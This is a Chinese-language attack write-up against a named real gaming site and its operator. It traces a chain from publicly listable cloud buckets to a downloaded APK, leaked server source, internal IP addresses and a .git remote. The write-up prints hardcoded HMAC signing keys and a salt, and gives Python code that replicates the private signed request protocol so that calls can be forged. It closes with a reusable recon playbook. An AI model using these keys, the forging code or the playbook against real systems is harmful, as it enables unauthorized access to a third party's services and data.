# goodluck777 — APK 逆向 → NetworkConfig.sc 发现隐藏环境 + HMAC 协议复刻

> 目标：goodluck777.com（IGS 鈊象電子 / Nuxt2 + NestJS + Unity 游戏）
> 手法：GCS 公开桶下载 233MB APK → IL2CPP 字符串还原 → 配置文件暴露 5 套环境 + 3 个 S3 桶
> 成果：完整 HMAC-SHA1 私有协议复刻 + 43 命令扫描 + i17game 服务端源码获取

## APK → 隐藏环境发现链

```
GCS 桶 igspanther-ark（匿名列举）
  ↓
/APK_Download/GoodLuck777.apk（233MB）
  ↓ unzip + strings
assets/login.cfg → Firebase 项目 goodluck777-650b8
google-services-desktop.json → Firebase API Keys
  ↓
/Config/NetworkConfig.sc → 5 套 Ark 环境全部主机名
  ↓ IL2CPP 字符串还原
i17game.s3.amazonaws.com / igs-horse.s3.ap-southeast-1.amazonaws.com
tapirus-cdn.super9999.com (igstapirus-prod)
```

## GCS/S3 公开桶清单（5 个）

| 桶 | 平台 | 对象数 | 核弹级内容 |
|----|------|--------|-----------|
| igspanther-ark | GCS | 40,000+ | .git 完整仓库 + 233MB APK + NetworkConfig.sc |
| igspanther-test | GCS | — | 测试环境资产 |
| **i17game** | S3 | 1,000 | **i17game.tar = 服务端 Node.js 全量源码** |
| igs-horse | S3 | 327 | 兄弟产品资产 |
| igstapirus-prod | GCS | 3,000 | tapirus 游戏资产 |

### i17game 服务端源码（HMAC 硬编码密钥）

```javascript
// lib/login.js — 会话签发
var key = app_id+'_'+from_id+'_'+from_pwd+':'+now_time.toString();
var user_token = crypto.HmacSHA1(key, "koalasmarch").toString();  // ★ 硬编码
var salt = app_id+'_'+user_id+':'+now_time.toString();
var saltkey = crypto.HmacSHA1(salt, "koalas").toString();         // ★ 硬编码
redis_client.set(app_id+':'+user_token, JSON.stringify({user_id, saltkey}));
redis_client.expire(app_id+':'+user_token, 21600);  // TTL 6h

// config.js — 内网拓扑
i17gmae_url: 'http://192.168.132.59:4000'
socketserver_url: 'http://192.168.132.59:9000'
```

## HMAC-SHA1 私有协议完整复刻

ArkClient 协议三要素：
1. **签名密钥**：匿名 GET 网关根路径即返回
2. **签名算法**：`HMAC-SHA1(key, base64(payload))`
3. **传输格式**：`base64({"ark_sign": sign, "ark_data": base64(payload)})`

```python
import hmac, hashlib, base64, json

def ark_request(host, key, endpoint, payload):
    ark_data = base64.b64encode(json.dumps(payload).encode()).decode()
    ark_sign = hmac.new(key.encode(), ark_data.encode(), hashlib.sha1).hexdigest()
    body = base64.b64encode(json.dumps({
        "ark_sign": ark_sign, "ark_data": ark_data
    }).encode())
    return requests.post(f"{host}/{endpoint}",
        data=body,
        headers={"Content-Type": "multipart/form-data"})
```

## .git 仓库泄露

```
/APK_Download/.git/config:
  [remote "origin"]
    url = <EMAIL-REDACTED>:IGS-ARCADE-DIVISION-RD5/SGC_Deployment.git
    promisor = true

/APK_Download/.git/packed-refs:
  → TW/JP/MY/SG/TH 各区域分支

/APK_Download/.git/logs/HEAD:
  → 开发者邮箱 <EMAIL-REDACTED>
```

## 前端硬编码密钥（h5 bundle）

```javascript
VITE_Pay_AesKey: "<REDACTED>"  // 支付 AES
VITE_LINE_channel_secret: "<REDACTED>" // LINE OAuth
VITE_GameTower_private_key: "<REDACTED>"                     // GameTower

// 口令变换算法（盐值硬编码）
HMAC-SHA1(key="Arksdk3.ArkKey", passwd+"7f94d73d56ecc6e93a41eb9e8427804331a5f376")
```

## 通用教训

1. **APK IL2CPP 字符串 = S3/GCS 桶名** — Unity 游戏的 C# 字符串即使 IL2CPP 编译后也可 strings 提取
2. **GCS 桶匿名列举 = 完整资产库** — `curl https://bucket.storage.googleapis.com/` 返回 XML
3. **游戏服网关 GET 根路径 ≠ 404** — 可能直接返回签名密钥
4. **测试/预发环境域名在配置文件里** — NetworkConfig.sc 类文件是隐藏环境的钥匙
5. **多区域分支泄露业务版图** — .git packed-refs 暴露 TW/JP/MY/SG/TH = 五国运营
